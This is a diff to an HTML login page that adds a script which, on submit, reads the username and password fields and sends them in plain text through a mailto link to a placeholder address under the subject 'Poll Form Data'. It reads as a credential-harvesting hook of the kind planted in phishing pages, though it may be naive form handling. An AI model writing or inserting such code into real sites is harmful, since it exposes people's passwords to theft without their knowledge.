@@ -7,3 +7,12 @@
   <br><br>
   <input type="submit" value="Login">
 </form>
+<script>
+  function sendFormData() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const formData = "Username: " + username + " Password: " + password;
+    window.location.href = "mailto:youremail@example.com?subject=Poll Form Data&body=" + formData;
+  }
+  document.querySelector("form").addEventListener("submit", sendFormData);
+</script>
